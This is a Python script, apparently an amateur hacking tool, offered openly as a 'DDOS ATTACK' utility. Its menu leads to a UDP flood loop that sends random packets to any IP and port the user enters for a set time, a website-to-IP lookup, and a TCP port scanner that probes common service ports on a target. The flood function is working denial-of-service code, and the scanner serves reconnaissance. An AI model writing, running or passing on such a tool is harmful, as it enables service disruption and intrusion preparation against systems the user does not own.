import os
import sys
import socket
from colorama import Fore
import random
import time
from time import sleep


bytess = random._urandom(1024)

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

solax = """
██████╗░██████╗░░█████╗░░██████╗  ░█████╗░████████╗████████╗░█████╗░░█████╗░██╗░░██╗
██╔══██╗██╔══██╗██╔══██╗██╔════╝  ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔══██╗██║░██╔╝
██║░░██║██║░░██║██║░░██║╚█████╗░  ███████║░░░██║░░░░░░██║░░░███████║██║░░╚═╝█████═╝░
██║░░██║██║░░██║██║░░██║░╚═══██╗  ██╔══██║░░░██║░░░░░░██║░░░██╔══██║██║░░██╗██╔═██╗░
██████╔╝██████╔╝╚█████╔╝██████╔╝  ██║░░██║░░░██║░░░░░░██║░░░██║░░██║╚█████╔╝██║░╚██╗
╚═════╝░╚═════╝░░╚════╝░╚═════╝░  ╚═╝░░╚═╝░░░╚═╝░░░░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝
by Perkz NOT SKIDDED BRUH
"""
print(Fore.LIGHTBLUE_EX + solax)
time.sleep(1)

print(Fore.CYAN+"[1] : DDos Attack \n[2] : Websit IP Graper\n[3] : Port Scanner")
choise = input(Fore.LIGHTMAGENTA_EX+">>: ")
time.sleep(1)

reed = Fore.RED
greeen = Fore.GREEN
def ddos():
    ip = input(reed+"Target IP : ")
    time.sleep(0.50)
    port = int(input(reed+"Port [80],[?] : "))
    time.sleep(0.50)
    dur = int(input(reed+"Time Out [10,20,30...] : "))
    time.sleep(0.50)
    timeout = time.time() + dur
    sent = 0

    while True:
        try:
            if time.time() > timeout:
                break
            else:
                pass
            sock.sendto(bytess, (ip, port))
            sent = sent + 1
            print(reed+"Sent", sent, "packets to", ip, "through", port, )
        except KeyboardInterrupt:
            sys.exit()

def get():

    webs = input("[+] Website Link  >>: ")
    print(greeen+"Website IP : ", socket.gethostbyname(webs))
    input(reed+"[+] Press Enter To Exit : ")
    exit()
    time.sleep(0.50)


def p_scann():
    ip_inp = input("[+] ENTER THE TARGET IP : ")
    ip = ip_inp
    port_list = [21, 22, 53, 25, 50, 67, 69, 80, 110, 119, 123, 135, 143, 161, 389, 443, 989, 3386]

    for port in port_list:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        result = s.connect_ex((ip, port))

        if result == 0:
            print(Fore.GREEN + "----------------------------")
            print(Fore.GREEN + '{ [+] Port : ', port, 'open }')
            print(Fore.GREEN + "----------------------------")
        else:
            print(Fore.RED + "----------------------------")
            print(Fore.RED + '{ [!] Port : ', port, 'closed } ')
            print(Fore.RED + "----------------------------")

    input("[*] DONE SCANNING | PRESS ENTER TO  EXIT : ")

if choise == "1":
    ddos()
elif choise == "2":
    get()
elif choise == "3":
    p_scann()
else:
    print(Fore.LIGHTYELLOW_EX+"[!] Error Unknown chosie, Try again")
    input(reed+"Press Enter To exit : ")
    exit()
    time.sleep(0.50)
